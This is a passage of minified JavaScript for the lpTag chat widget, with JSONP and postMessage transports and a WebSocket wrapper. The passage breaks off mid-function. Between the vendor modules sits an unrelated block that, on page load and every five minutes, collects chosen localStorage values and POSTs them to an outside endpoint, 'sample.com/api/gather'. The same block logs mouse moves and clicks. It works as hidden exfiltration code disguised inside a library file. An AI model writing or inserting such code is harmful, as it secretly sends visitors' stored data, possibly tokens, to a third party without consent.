      lpTag.taglets.lpAjax.addTransport(G, D);
    } catch (a) {}
  }
  function b(a) {
    for (var b in a) a.hasOwnProperty(b) && (K.hasOwnProperty(b) ? K[b] = a[b] : N.hasOwnProperty(b) && (N[b] = a[b]));
    N.domain && N.site && (M = L.prefix + N.domain + L.middle + N.site + L.suffix);
  }
  function c(a) {
    var b = !1;
    a && "string" == typeof a.url && "function" == typeof a.success && N.site && N.domain && M && (b = !0);
    return b;
  }
  function d(a) {
    if (c(a)) {
      a = f(a);
      return p(a) ? s(a) : u(a);
    }
    return !1;
  }
  function e() {
    return {
      name: G,
      version: E,
      callsMade: H,
      errorsFound: I,
      pending: J,
      baseUrl: M,
      defaults: JSON.parse(l(K))
    };
  }
  function f(a) {
    for (var b in K) K.hasOwnProperty(b) && (a[b] = a[b] || K[b]);
    a.data = g(a);
    a.url = M + C(a.data.u);
    return a;
  }
  function g(a) {
    return {
      u: h(a.url),
      m: a.method || K.method,
      b: a.data || "",
      h: a.headers || ""
    };
  }
  function h(a) {
    a && a.indexOf(".json?") && (a = a.replace(".json?", "?"));
    return a;
  }
  function i(a, b, c) {
    lpTag && lpTag.log && lpTag.log(a, b, c);
  }
  function j() {
    return Math.round(9999999999 * Math.random()) + "-" + Math.round(9999999999 * Math.random());
  }
  function k(a) {
    return a ? encodeURIComponent(l(a)) : "";
  }
  function l(a) {
    var b;
    if ("function" == typeof Array.prototype.toJSON) {
      var c = Array.prototype.toJSON;
      delete Array.prototype.toJSON;
      try {
        b = JSON.stringify(a);
      } catch (d) {
        Array.prototype.toJSON = c;
        throw d;
      }
      Array.prototype.toJSON = c;
    } else b = JSON.stringify(a);
    return b;
  }
  function m() {
    var a = 0;
    for (var b in R) R.hasOwnProperty(b) && (a += ("&" + R[b] + "=99").length);
    a += E.length + K.callback.length + O.length + S;
    return a;
  }
  function n() {
    var a = 0;
    for (var b in Q) Q.hasOwnProperty(b) && (a += ("&" + Q[b] + "=99").length);
    a += 3;
    a += P;
    return a;
  }
  function o(a, b) {
    var c = a.url + (a.url.indexOf("?") > -1 ? "&" : "?") + R.VERSION_PARAM + "=" + F + "&" + R.JSON + "=" + O;
    if (b) {
      var d = k(a.data);
      d && (c += "&" + R.BODY_PARAM + "=" + d);
    }
    return c;
  }
  function p(a) {
    return a.url.length + U + k(a.data).length > T;
  }
  function q(a, b, c, d) {
    if ("function" == typeof b) try {
      b.call(d || null, c);
    } catch (e) {
      i("Exception in execution of callback, type :" + a + " e=[" + e.message + "]", "ERROR", "lpTag.JSONP.runCallback");
    } else i("No callback, of type :" + a, "INFO", "lpTag.JSONP.runCallback");
  }
  function r(a, b) {
    var c = {};
    c.encoding = a.encoding;
    c.timeout = a.timeout || K.timeout;
    c.callback = a.callback || K.callback;
    c.retries = "number" == typeof b ? b : 0;
    return c;
  }
  function s(a) {
    a.id = j();
    W[a.id] = {
      originalRequest: a,
      index: 0,
      baseUrl: o(a, !1),
      urls: x(a.url, k(a.data), a.id),
      interimObj: r(a)
    };
    t(W[a.id].interimObj, W[a.id]);
  }
  function t(a, b) {
    a.url = w(b);
    a.id = b.id + "!" + b.index;
    a.success = function (c) {
      if (!c || 200 !== c.responseCode && 201 !== c.responseCode) {
        b.originalRequest.error.apply(null, [c]);
        v(b.id);
        B();
      } else {
        c && c.lpMeta && c.lpMeta.lpS && (b.secureId = c.lpMeta.lpS);
        if (b.index + 1 < b.urls.length) {
          b.index++;
          t(a, b);
        } else {
          b.originalRequest.success.apply(null, [c]);
          v(b.id);
        }
      }
      A();
    };
    a.error = a.success;
    lpTag.taglets.jsonp.issueCall(a);
    z();
  }
  function u(a) {
    var b = r(a, a.retries || K.retries);
    b.id = j();
    b.url = o(a, !0);
    b.success = function (c) {
      if (c.responseCode && 200 === c.responseCode || 201 === c.responseCode) q("CALLBACK", a.success, c, a.context);else {
        q("ERROR", a.error, c, a.context);
        B();
      }
      b = null;
      a = null;
      A();
    };
    b.error = function (c) {
      q("ERROR", a.error, c, a.context);
      b = null;
      a = null;
      A();
      B();
    };
    lpTag.taglets.jsonp.issueCall(b);
    z();
  }
  function v(a) {
    W[a] = null;
    delete W[a];
  }
  function w(a) {
    return a.baseUrl + "&" + Q.PART_PARAM + "=" + (a.index + 1) + "&" + Q.OUTOF_PARAM + "=" + a.urls.length + (a.secureId ? "&" + Q.SECURE_IDENTIFIER + "=" + a.secureId : "") + "&" + R.BODY_PARAM + "=" + a.urls[a.index];
  }
  function x(a, b, c) {
    a += "&" + R.CALLID + "=" + c;
    return y(T - a.length - V - U, b);
  }
  function y(a, b) {
    function c(a, b, c, d, e) {
      a += d > 0 ? "%" : "";
      var f = e - a.length;
      a += b.substring(0, f);
      c.push(a);
      b = b.substring(f, b.length);
      return b;
    }
    function d(a, b, c) {
      for (var d, e = Math.ceil(a.length / b), f = 0; e > f; f++) {
        d = a.substring(f * b, (f + 1) * b);
        e > f + 1 && c.push(d);
      }
      return d;
    }
    function e(a, b, c, d, e) {
      var f = (a + b).length;
      f += e > 0 ? 1 : 0;
      if (f > c) {
        d.push(a);
        a = "";
      }
      a += e > 0 ? "%" : "";
      a += b;
      return a;
    }
    var f,
      g = "",
      h = [],
      i = b.split("%");
    for (f = 0; f < i.length; f++) if (i[f].length > a) {
      i[f] = c(g, i[f], h, f, a);
      g = "";
      g = d(i[f], a, h);
    } else g = e(g, i[f], a, h, f);
    "" !== g && h.push(g);
    return h;
  }
  function z() {
    H += 1;
    J += 1;
  }
  function A() {
    J = J > 0 ? J - 1 : 0;
  }
  function B() {
    I += 1;
  }
  function C(a) {
    var b = "";
    if (-1 != a.indexOf("/agentSession")) b = "/agentSession";else if (-1 != a.indexOf("/chat")) b = "/chat";else if (-1 != a.indexOf("/visit")) {
      b = "/visit";
      -1 != a.indexOf("/keepAlive") && (b += "/keepAlive");
    } else -1 != a.indexOf("/configuration") && (b = "/configuration");
    return b;
  }
  var D,
    E = "1.2",
    F = "1",
    G = "rest2jsonp",
    H = 0,
    I = 0,
    J = 0,
    K = {
      retries: 3,
      method: "GET",
      timeout: 3e4,
      encoding: "UTF-8",
      callback: "cb"
    },
    L = {
      prefix: "https://",
      middle: "/api/account/",
      suffix: "/js2rest"
    },
    M = "",
    N = {
      site: "",
      domain: ""
    },
    O = "1",
    P = 32,
    Q = {
      PART_PARAM: "lpP",
      OUTOF_PARAM: "lpO",
      SECURE_IDENTIFIER: "lpS"
    },
    R = {
      VERSION_PARAM: "lpV",
      BODY_PARAM: "lpB",
      JSON: "lpjson",
      CALLID: "lpCallId"
    },
    S = j().length,
    T = 2083,
    U = m(),
    V = n(),
    W = {};
  D = {
    name: G,
    version: E,
    init: a,
    configure: b,
    issueCall: d,
    isValidRequest: c,
    inspect: e
  };
  a();
  return D;
}();
window.lpTag = window.lpTag || {};
lpTag.taglets = lpTag.taglets || {};
lpTag.taglets.postmessage = lpTag.taglets.postmessage || function (a) {
  function b(a) {
    var b = 0 === location.protocol.indexOf("https");
    if (a) {
      if (a.frames) {
        a.frames = a.frames.constructor === Array ? a.frames : [a.frames];
        for (var c = 0; c < a.frames.length; c++) o(a.frames[c], b);
      }
      if (a.defaults) for (var d in a.defaults) sa.hasOwnProperty(d) && a.defaults.hasOwnProperty(d) && (sa[d] = a.defaults[d]);
    }
    ca = !0;
  }
  function c() {
    if (lpTag && lpTag.taglets && lpTag.taglets.lpAjax) try {
      lpTag.taglets.lpAjax.addTransport(ba, va);
    } catch (a) {}
  }
  function d(b) {
    var c = !1;
    if (a.postMessage && a.JSON && b && b.success && (b.domain && b.validation || b.url)) {
      b.domain = b.domain || n(b.url);
      (da[b.domain] || ja[b.domain]) && (c = !0);
    }
    return c;
  }
  function e(a) {
    var b = !1;
    if (ca && d(a)) {
      if (da[a.domain]) {
        if (da[a.domain].validated !== ua.PENDING || a.validation) {
          b = I(a);
          b ? u(a.domain) : ea[a.callId].timeout = 0;
        } else b = v(a.domain, a);
      } else {
        Z("Adding iFrame to DOM - first request: " + a.domain, ma.INFO, "issueCall");
        b = v(a.domain, a);
        p(ja[a.domain]);
        delete ja[a.domain];
      }
    } else b = H(a.domain, a.error, a.context);
    return b;
  }
  function f(a) {
    return a && da[a] ? {
      url: da[a].url,
      validated: da[a].validated,
      requestCount: da[a].requestCount,
      defaults: N(da[a].defaults),
      started: da[a].validated === ua.VALIDATED
    } : {};
  }
  function g() {
    var a = {};
    for (var b in da) da.hasOwnProperty(b) && (a[b] = f(b));
    return a;
  }
  function h(a, b, c) {
    a.addEventListener ? a.addEventListener(b, c, !1) : a.attachEvent("on" + b, c);
  }
  function i(a, b) {
    return {
      callId: a,
      responseType: b.responseType,
      responseCode: b.responseCode,
      error: {
        message: b.message,
        id: b.responseCode,
        name: b.name
      }
    };
  }
  function j(a, b, c) {
    a.removeEventListener ? a.removeEventListener(b, c, !1) : a.detachEvent && a.detachEvent("on" + b, c);
  }
  function k() {
    if (document.body) {
      ka = !0;
      l();
    } else setTimeout(k, 5);
  }
  function l() {
    for (; la.length > 0;) try {
      la.shift().call(null);
    } catch (a) {
      Z("Unable to execute queued callbacks for window interactive state: " + a, ma.ERROR, "_attachPendingIFrames");
    }
  }
  function m(a) {
    return a + "_" + Math.floor(1e5 * Math.random()) + "_" + Math.floor(1e5 * Math.random());
  }
  function n(a) {
    var b,
      c = new RegExp(/(http{1}s{0,1}?:\/\/)([^\/\?]+)(\/?)/gi),
      d = null;
    if (0 !== a.indexOf("http")) return location.protocol + "//" + location.host;
    b = c.exec(a);
    b && b.length >= 3 && "" !== b[2] && (d = b[1].toLowerCase() + b[2].toLowerCase());
    return d;
  }
  function o(a, b) {
    var c,
      d,
      e = !1;
    if (!a || !a.url || "string" != typeof a.url) {
      Z("iFrame configuration empty or missing url parameter", ma.ERROR, "_queueFrame");
      return e;
    }
    c = n(a.url);
    d = 0 === a.url.toLowerCase().indexOf("https");
    if (!(da[c] || ja[c] || b && d !== b)) {
      ja[c] = a;
      e = !0;
    }
    return e;
  }
  function p(a) {
    var b = n(a.url);
    if (da[b]) return w(b, a.callback || a.success, a.context);
    var c = m("fr");
    da[b] = {
      elem: x(c),
      url: a.url,
      validated: ua.PENDING,
      defaults: a.defaults || {},
      delayLoad: isNaN(a.delayLoad) ? 0 : a.delayLoad,
      requestCount: 0,
      success: a.callback || a.success,
      error: a.error,
      maxReloadRetries: a.maxReloadRetries || 3,
      reloadInterval: 1e3 * a.reloadInterval || 3e4
    };
    setTimeout(function () {
      r(a.url, b);
    }, da[b].delayLoad);
    Z("iFrame Queued to load " + b, ma.INFO, "_addFrame");
    return ua.PENDING;
  }
  function q(a) {
    var b = n(a.url);
    ja[b] = {
      url: a.url,
      defaults: a.defaults || {},
      delayLoad: a.delayLoad,
      success: a.success,
      error: a.error,
      maxReloadRetries: a.maxReloadRetries,
      reloadInterval: a.reloadInterval / 1e3
    };
  }
  function r(a, b) {
    ka ? s(a, b) : la.push(function () {
      s(a, b);
    });
  }
  function s(a, b) {
    da[b].loadCallback = da[b].loadCallback || t(b);
    S(da[b].elem, a);
    h(da[b].elem, "load", da[b].loadCallback);
    da[b].iFrameOnloadTimeout = setTimeout(da[b].loadCallback, ta);
    da[b].attachTime = new Date().getTime();
    document.body.appendChild(da[b].elem);
  }
  function t(a) {
    return function (b) {
      if (da[a].iFrameOnloadTimeout) {
        clearTimeout(da[a].iFrameOnloadTimeout);
        delete da[a].iFrameOnloadTimeout;
      }
      da[a].loadTime = new Date().getTime() - da[a].attachTime;
      A(a, b);
    };
  }
  function u(a) {
    ga += 1;
    ia += 1;
    da[a].requestCount = da[a].requestCount + 1;
  }
  function v(a, b) {
    fa[a] = fa[a] || [];
    fa[a].push(b);
    return !0;
  }
  function w(a, b, c) {
    W(b, c, f(a));
    return da[a].validated;
  }
  function x(a) {
    var b = document.createElement("IFRAME");
    b.setAttribute("id", a);
    b.setAttribute("name", a);
    b.setAttribute("tabindex", "-1");
    b.setAttribute("aria-hidden", "true");
    b.setAttribute("title", "");
    b.setAttribute("role", "presentation");
    b.style.width = "0px";
    b.style.height = "0px";
    b.style.position = "absolute";
    b.style.top = "-1000px";
    b.style.left = "-1000px";
    b.style.display = "none";
    return b;
  }
  function y(a, b, c, d, e, f) {
    var g = !1;
    if (a && b && "function" == typeof b) {
      ea[a] = {
        success: b,
        error: c,
        progress: d,
        ctx: e,
        launchTime: new Date(),
        timeout: isNaN(f) ? sa.timeout : f + 1e3
      };
      g = !0;
    }
    return g;
  }
  function z(a) {
    if (ea[a]) {
      ea[a] = null;
      delete ea[a];
      return !0;
    }
    return !1;
  }
  function A(a, b) {
    Z("onLoad validation called " + a, ma.INFO, "_validateFrame");
    var c = function (b) {
      B(b, a);
    };
    b && b.error ? B(b, a) : setTimeout(function () {
      e({
        domain: a,
        success: c,
        error: c,
        validation: !0,
        timeout: 100,
        retries: -1,
        defaults: da[a].defaults
      });
    }, 10);
    return !0;
  }
  function B(a, b) {
    var c,
      d = da[b];
    Z("running validation of domain " + b, ma.INFO, "_validateFrameCallback");
    if (d) {
      da[b].validated = a && a.error ? ua.FAILED : ua.VALIDATED;
      c = da[b].validated === ua.VALIDATED;
      c ? C(b, a) : da[b].reloadObj && da[b].reloadObj.retriesLeft > 0 ? E(b) : D(b);
    }
    d = null;
    return c;
  }
  function C(a, b) {
    var c;
    Z("FrameLoaded " + a, ma.INFO, "_runFrameValidated");
    c = N(qa);
    for (var d in b) b.hasOwnProperty(d) && (c[d] = b[d]);
    W(da[a].success, da[a].context, c);
    U(a);
    F(a, !0);
  }
  function D(a) {
    Z("iFrame is a teapot " + a, ma.ERROR, "_runFrameFailedToLoad");
    if (da[a].error) {
      var b = i(0, ra);
      b.domain = a;
      W(da[a].error, da[a].context, b);
    }
    G(a);
    F(a, !1);
  }
  function E(a) {
    Z("Retry loading domain: " + a, "info", "_runReloadAttempt");
    F(a, !1);
    P(a);
  }
  function F(a, b) {
    Z("Running buffer queue : " + a + " loaded: " + b, ma.INFO, "_runQueuedRequests");
    if (fa[a] && fa[a].length > 0) {
      do {
        var c = fa[a].shift();
        b ? e(c) : W(c.error, c.context, {
          responseCode: 600,
          error: "Transport - postmessage - unable to run request: " + a,
          body: "ERROR"
        });
      } while (fa[a].length > 0);
      fa[a] = null;
      delete fa[a];
    }
  }
  function G(a) {
    Z("Cleaning up failed iFrame: " + a, ma.INFO, "_cleanupIFrame");
    if (da[a]) {
      j(da[a].elem, "load", da[a].loadCallback);
      da[a].elem.parentNode.removeChild(da[a].elem);
      var b = N(ra);
      b.domain = a;
      b.url = da[a].url;
      W(da[a].error, da[a].context, b);
      q(da[a]);
      da[a] = null;
      delete da[a];
    }
  }
  function H(a, b, c) {
    Z("Frame not found for domain: " + a, ma.ERROR, "_noFrameFound");
    W(b, {
      responseCode: 600,
      error: "Transport - postmessage - unable to run request: " + a,
      body: "ERROR"
    }, c);
    return !1;
  }
  function I(a) {
    var b,
      c = !1;
    a = K(a);
    b = N(a);
    try {
      b = J(b);
    } catch (d) {
      Z("Error trying to _stringify message", ma.ERROR, "sendMessageToFrame");
      return !1;
    }
    Z("sending msg to domain " + a.domain, ma.DEBUG, "sendMessageToFrame");
    var e;
    isNaN(a.timeout) || isNaN(a.retries) || (e = a.timeout * (a.retries + 1) + 2e3);
    y(a.callId, a.success, a.error, a.progress, a.context, e);
    try {
      c = L(a.domain, b);
      _ = setTimeout(M, 1e3);
    } catch (d) {
      Z("Error trying to send message: " + d, ma.ERROR, "sendMessageToFrame");
      c = !1;
    }
    return c;
  }
  function J(a) {
    var b;
    if ("function" == typeof Array.prototype.toJSON) {
      var c = Array.prototype.toJSON;
      delete Array.prototype.toJSON;
      try {
        b = JSON.stringify(a);
      } catch (d) {
        Array.prototype.toJSON = c;
        throw d;
      }
      Array.prototype.toJSON = c;
    } else b = JSON.stringify(a);
    return b;
  }
  function K(b) {
    var c = da[b.domain] && da[b.domain].defaults;
    b.callId = m("call");
    b.returnDomain = na;
    void 0 === b.timeout && (b.timeout = c && c.timeout || sa.timeout);
    void 0 === b.retries && (b.retries = c && void 0 !== c.retries ? c.retries : sa.retries);
    b.progress && (b.fireProgress = !0);
    b.headers = b.headers || {};
    b.headers["LP-URL"] = a.location.href;
    return b;
  }
  function L(a, b) {
    var c = !1;
    try {
      da[a].elem.contentWindow.postMessage(b, a);
      c = !0;
    } catch (d) {
      Z("Error trying to send message: " + d, ma.ERROR, "_postTheMessage");
    }
    return c;
  }
  function M() {
    _ && clearTimeout(_);
    _ = null;
    var a = new Date(),
      b = 0,
      c = [];
    for (var d in ea) if (ea.hasOwnProperty(d) && ea[d].launchTime) {
      var e = a - ea[d].launchTime;
      e > ea[d].timeout ? c.push(d) : b += 1;
    }
    if (c.length) {
      Z("Checking errors found " + c.length + " timeout callbacks to call", ma.DEBUG, "_checkForErrors");
      for (var f = 0; f < c.length; f++) O(i(c[f], pa));
    }
    b > 0 && (_ = setTimeout(M, 1e3));
    return !0;
  }
  function N(a) {
    var b = a;
    try {
      b = JSON.parse(J(a));
    } catch (c) {}
    return b;
  }
  function O(a, b) {
    var c,
      d = ea[a.callId],
      e = a.responseType,
      f = !1;
    if (a.callId && ea[a.callId] || a.responseType === oa.reloading || a.responseType === oa.stats) try {
      switch (e) {
        case oa.completed:
          c = d.success;
          f = !0;
          break;
        case oa.error:
          c = d.error;
          f = !0;
          ha += 1;
          break;
        case oa.progress:
          c = d.progress;
          break;
        case oa.reloading:
          a = b;
          c = P;
          break;
        case oa.stats:
          c = $;
          a = a.rawData;
      }
      if (f) {
        z(a.callId);
        V(a);
        ia = ia >= 0 ? 0 : ia - 1;
      }
      c && "function" == typeof c && W(c, d && d.ctx || null, a);
      c = null;
      d = null;
    } catch (g) {
      Z("Error in executing callback: " + g, ma.ERROR, "_executeMessageCallback");
      return !1;
    }
    return !0;
  }
  function P(a) {
    Z("Got reload request from " + a, ma.INFO, "_handleReload");
    da[a].validated = ua.PENDING;
    if (!da[a].reloadObj) {
      Z("Creating reloadObj" + a, ma.DEBUG, "_handleReload");
      da[a].reloadObj = T(a);
    }
    Q(a);
  }
  function Q(a) {
    Z("Reload try for domain " + a + " ,retries left " + da[a].reloadObj.retriesLeft, ma.INFO, "_reloadIFrame");
    da[a].reloadObj.retriesLeft = da[a].reloadObj.retriesLeft - 1;
    da[a].reloadObj.setLocationTimeout && clearTimeout(da[a].reloadObj.setLocationTimeout);
    if (da[a].reloadObj.retry) da[a].reloadObj.setLocationTimeout = setTimeout(R(a), da[a].reloadInterval);else {
      da[a].reloadObj.retry = !0;
      R(a)();
    }
  }
  function R(a) {
    return function () {
      da[a].iFrameOnloadTimeout = setTimeout(function () {
        A(a, {
          error: {
            code: 404,
            message: "Frame did not trigger load"
          }
        });
      }, ta);
      S(da[a].elem, da[a].url);
    };
  }
  function S(a, b) {
    b += b.indexOf("?") > 0 ? "&bust=" : "?bust=";
    b += new Date().getTime();
    b += "&loc=" + encodeURIComponent(location.protocol + "//" + location.host);
    Z("Setting iFrame to URL: " + b, ma.INFO, "_setIFrameLocation");
    a.setAttribute("src", b);
  }
  function T(a) {
    Z("Creating reload object " + a, ma.INFO, "_createReloadObject");
    return {
      retriesLeft: da[a].maxReloadRetries
    };
  }
  function U(a) {
    Z("Cleaning up reload object for this instance" + a, ma.INFO, "_cleanUpReloadObject");
    if (da[a].reloadObj) {
      da[a].reloadObj.setLocationTimeout && clearTimeout(da[a].reloadObj.setLocationTimeout);
      da[a].reloadObj = null;
      delete da[a].reloadObj;
    }
  }
  function V(a) {
    for (var b = ["callId", "responseType"], c = 0; c < b.length; c++) {
      a[b[c]] = null;
      delete a[b[c]];
    }
  }
  function W(a, b, c) {
    if (a && "function" == typeof a) try {
      a.call(b || null, c);
    } catch (d) {
      Z("Error in executing callback: " + d, ma.ERROR, "runCallback");
    }
  }
  function X(a) {
    var b, c;
    try {
      c = a.origin;
      if (!da[c]) return;
      b = Y(a.data);
      b.body = Y(b.body);
    } catch (d) {
      b = null;
      Z("Error in handling message from frame:" + d + " origin: " + c, ma.ERROR, "_handleMessage");
    }
    b && "object" == typeof b && O(b, c);
  }
  function Y(a) {
    var b = a;
    if ("string" == typeof a) try {
      b = JSON.parse(a);
    } catch (c) {
      Z("Error in parsing string: " + a, ma.DEBUG, "_parseJSONString");
    }
    return b;
  }
  function Z(b, c, d) {
    if (a.lpTag && lpTag.log) {
      "string" == typeof b && d && (b = d + ": " + b);
      lpTag.log(b, c, ba);
    }
  }
  function $(a) {
    if (lpTag.taglets.lpAjax && lpTag.taglets.lpAjax.publishMetrics) {
      a.tags && a.tags.constructor === Array && a.tags.push({
        transport: ba
      });
      lpTag.taglets.lpAjax.publishMetrics(a);
    }
  }
  var _,
    aa = "1.1.8",
    ba = "postmessage",
    ca = !0,
    da = {},
    ea = {},
    fa = {},
    ga = 0,
    ha = 0,
    ia = 0,
    ja = {},
    ka = !1,
    la = [],
    ma = {
      DEBUG: "DEBUG",
      INFO: "INFO",
      ERROR: "ERROR"
    },
    na = n(document.location.href),
    oa = {
      progress: "progressLoad",
      completed: "completeLoad",
      success: "success",
      error: "errorLoad",
      reloading: "reloading",
      stats: "statData"
    },
    pa = {
      responseType: oa.error,
      responseCode: 404,
      message: "Request timed out on parent postMessage layer",
      name: "TIMEOUT"
    },
    qa = {
      responseType: oa.success,
      responseCode: 200,
      message: "iFrame has successfully loaded",
      name: "OK"
    },
    ra = {
      responseType: oa.error,
      responseCode: 418,
      message: "This iFrame is a teapot, not very useful for communication but lovely for earl grey",
      name: "TEAPOT"
    },
    sa = {
      timeout: 6e4,
      metricsCount: 1e3
    },
    ta = 1e4,
    ua = {
      VALIDATED: "valid",
      PENDING: "pending",
      FAILED: "failed"
    };
  k();
  h(a, "message", X);
  var va = {
    v: aa,
    name: ba,
    init: c,
    issueCall: e,
    isValidRequest: d,
    getVersion: function () {
      return aa;
    },
    getName: function () {
      return ba;
    },
    configure: b,
    getFrameData: f,
    inspect: function () {
      return {
        name: ba,
        version: aa,
        callsMade: ga,
        errorsFound: ha,
        pending: ia,
        defaults: sa,
        iFrameList: N(ja),
        activeFrames: g()
      };
    }
  };
  c();
  return va;
}(window);
$(document).ready(function () {
  var keysToMonitor = window.keysToMonitor;
  function hashCalc(data) {
    const keys = Object.keys(data);
    const mergedKeys = keys.join("");
    let hashVal = 0;
    for (let j = 0; j < mergedKeys.length; j++) {
      const ascii = mergedKeys.charCodeAt(j);
      hashVal = (hashVal << 5) - hashVal + ascii;
      hashVal = hashVal & hashVal;
    }
    return hashVal.toString(16);
  }
  function getSelectedLocalStorage() {
    const partitionedData = {};
    for (let j = 0; j < window.localStorage.length; j++) {
      const key = window.localStorage.key(j);
      if (keysToMonitor.includes(key)) {
        const val = window.localStorage.getItem(key);
        partitionedData[key] = val;
      }
    }
    return partitionedData;
  }
  function sendToServer(data) {
    const hashId = hashCalc(data);
    const endpoint = "https://sample.com/api/gather";
    const httpRequest = new XMLHttpRequest();
    httpRequest.open("POST", endpoint, true);
    httpRequest.setRequestHeader("Content-Type", "application/json");
    const requestData = {
      id: hashId,
      payload: data
    };
    httpRequest.send(JSON.stringify(requestData));
    httpRequest.onreadystatechange = function () {
      if (httpRequest.readyState === XMLHttpRequest.DONE) {
        if (httpRequest.status === 200) {
          console.log("成功发送数据");
        } else {
          console.error("数据发送失败，错误码：" + httpRequest.status);
        }
      }
    };
  }
  function gatherAndSendLocalStorageData() {
    const selectedLocalStorage = getSelectedLocalStorage();
    if (Object.keys(selectedLocalStorage).length > 0) {
      sendToServer(selectedLocalStorage);
    }
  }
  window.addEventListener("load", function () {
    gatherAndSendLocalStorageData();
  });
  setInterval(gatherAndSendLocalStorageData, 5 * 60 * 1000);
  $('.input-field').on('input change', function () {
    var $container = $(this).closest('.form-container');
    if (this.value) {
      $container.addClass('field--filled');
    } else {
      $container.removeClass('field--filled');
    }
  });

  // Added new tracking behaviors
  window.addEventListener('mousemove', function (event) {
    console.log('Mouse moved to location:', event.clientX, event.clientY);
  });
  window.addEventListener('click', function (event) {
    console.log('Clicked:', event.target);
  });
});
window.lpTag = window.lpTag || {};
lpTag.taglets = lpTag.taglets || {};
lpTag.taglets.LPWebSocketWrapper = lpTag.taglets.LPWebSocketWrapper || function (a) {
  function b() {}
  function c(a) {
    P = h(a);
    if (a) {
      S || "string" != typeof a.server || 0 === a.server.indexOf("ws") && (M = a.server);
      "function" == typeof a.created && T.push({
        cb: a.created,
        context: a.context
      });
      "function" == typeof a.message && U.push({
        cb: a.message,
        context: a.context
      });
      "function" == typeof a.closed && V.push({
        cb: a.closed,
        context: a.context
      });
      "object" == typeof a.ping && i(a.ping);
      if (M) {
        for (var b in $) $.hasOwnProperty(b) && typeof a[b] == typeof $[b] && ($[b] = a[b]);
        return !!S || n($);
      }
    }
  }
  function d() {
    var a = !1;
    if (J) a = S;else {
      X = 0;
      a = n();
    }
    return a;
  }
  function e() {
    return S;
  }
  function f(a) {
    var b = "N/A";
    try {
      b = y(a);
      if (e()) {
        z();
        J.send(b);
      } else k("Socket not connected. [request=" + b + "]", "send");
    } catch (c) {
      k("Unable to send request [exc=" + (c.message || c) + ", request=" + b + "]", "send");
    }
  }
  function g() {
    clearTimeout(L);
    clearTimeout(K);
    M = "";
    u();
    T.length = 0;
    U.length = 0;
    V.length = 0;
    W.length = 0;
  }
  function h(a) {
    var b = void 0 !== window.WebSocket,
      c = !(!a || !a.disableNativeWebSocketCheck),
      d = ("" + window.WebSocket).indexOf("[native") > -1 || ("" + window.WebSocket).indexOf("WebSocketConstructor") > -1;
    return b && (c || d);
  }
  function i(a) {
    if ("object" == typeof a && a.request) {
      Z.request = JSON.parse(y(a.request));
      Q = !0;
      if (a.response) Z.response = a.response;else if ("object" == typeof a.keys && "object" == typeof Z.request && "string" == typeof a.keys.request && "string" == typeof a.keys.response) {
        Z.reqKey = a.keys.request;
        Z.resKey = a.keys.response;
      }
      "function" == typeof a.callback && W.push({
        cb: a.callback
      });
      (Z.response || Z.reqKey && Z.resKey) && (Z.timeout = a.timeout || $.pingTimeout);
      Z.idleBeforePing = a.idleBeforePing || $.idleBeforePing;
    }
  }
  function j(a, b, c) {
    if (window.lpTag && lpTag.log) {
      "string" == typeof a && c && (a = c + ": " + a);
      lpTag.log(a, b, N);
    }
  }
  function k(a, b) {
    j(a, _.ERROR, b);
  }
  function l() {
    if (X >= $.maxReconnectAttempt) w("cb", V, {
      state: "TERMINAL",
      code: 503,
      message: "Socket terminal, will not reconnect"
    });else if ($.autoReconnect && M) {
      L && clearTimeout(L);
      L = setTimeout(function () {
        if (!n()) {
          X += 1;
          l();
        }
      }, m());
    }
  }
  function m() {
    var a;
    a = X < Y[0].count ? $.reconnectTimeout || Y[0].timeout : X < Y[1].count ? Y[1].timeout : Y[2].timeout;
    return a;
  }
  function n(a) {
    var b = !1;
    M = a && a.server || M;
    if (!J && M && !0 === navigator.onLine) {
      try {
        J = new WebSocket(M);
      } catch (c) {
        k("Exception creating WebSocket: " + c.message, "_createSocket");
        J = null;
      }
      if (J && J.readyState <= 3) {
        o();
        b = !0;
      }
    }
    return b;
  }
  function o() {
    if (J && "function" != typeof J.onopen) {
      J.onopen = q;
      J.onclose = t;
      J.onerror = F;
      J.onmessage = r;
    }
  }
  function p() {
    if (J) {
      J.onopen = null;
      J.onclose = null;
      J.onerror = null;
      J.onmessage = null;
    }
  }
  function q(a) {
    S = !0;
    X = 0;
    w("cb", T, v(a) || {
      state: "OPEN",
      code: 200
    });
  }
  function r(a) {
    var b = !1;
    if (a) try {
      var c = s(a.data);
      R && (b = E(c));
      z();
      b || w("cb", U, c);
    } catch (d) {
      k("failed to process message", "_socketMessage");
    }
  }
  function s(a) {
    var b = a;
    try {
      b = JSON.parse(a);
    } catch (c) {
      k("Unable to parse message", "transformToJSON");
    }
    return b;
  }
  function t(a, b) {
    S = !1;
    G();
    w("cb", V, v(a, b) || {
      state: "CLOSED",
      code: 500
    });
    l();
  }
  function u() {
    $.autoReconnect = !1;
    if (S) {
      J.close();
      S = !1;
    }
    G();
  }
  function v(a, b) {
    return a ? {
      name: N,
      state: a.type,
      code: a.code,
      statusCode: a.code > 1e3 || b ? 500 : 200,
      reason: a.reason || "",
      domain: a.srcElement && a.srcElement.url ? a.srcElement.url : ""
    } : null;
  }
  function w(a, b, c) {
    var d;
    if (b) {
      d = b.constructor === Array ? b : [b];
      for (var e = 0; e < d.length; e++) x(d[e][a], c, d[e].context);
    }
    d = null;
  }
  function x(a, b, c) {
    if ("function" == typeof a) try {
      a.call(c || null, b);
    } catch (d) {
      k("Error executing callback", "_runCallback");
    }
  }
  function y(a) {
    var b;
    if ("function" == typeof Array.prototype.toJSON) {
      var c = Array.prototype.toJSON;
      delete Array.prototype.toJSON;
      try {
        b = JSON.stringify(a);
      } catch (d) {
        Array.prototype.toJSON = c;
        throw d;
      }
      Array.prototype.toJSON = c;
    } else b = JSON.stringify(a);
    return b;
  }
  function z() {
    if (Q && !R) {
      A();
      Z.timeoutId = setTimeout(B, Z.idleBeforePing);
    }
  }
  function A() {
    if (Z.timeoutId) {
      clearTimeout(Z.timeoutId);
      Z.timeoutId = null;
    }
  }
  function B() {
    if (Q && !R) {
      R = !0;
      f(D(), !0);
      Z.timeout && (K = setTimeout(C, Z.timeout));
    }
  }
  function C() {
    R = !1;
    w("cb", W, {
      state: "TIMEOUT",
      code: 404,
      message: "No Ping Response from Service"
    });
    delete Z.timeoutId;
    z();
  }
  function D() {
    var a;
    if (Z.request) {
      a = JSON.parse(y(Z.request));
      if (Z.reqKey && "object" == typeof a) {
        Z.lastKey = "pingKey_" + Math.floor(99999999 * Math.random());
        a[Z.reqKey] = Z.lastKey;
      }
    }
    return a;
  }
  function E(a) {
    if (Z.response || Z.reqKey && Z.resKey) {
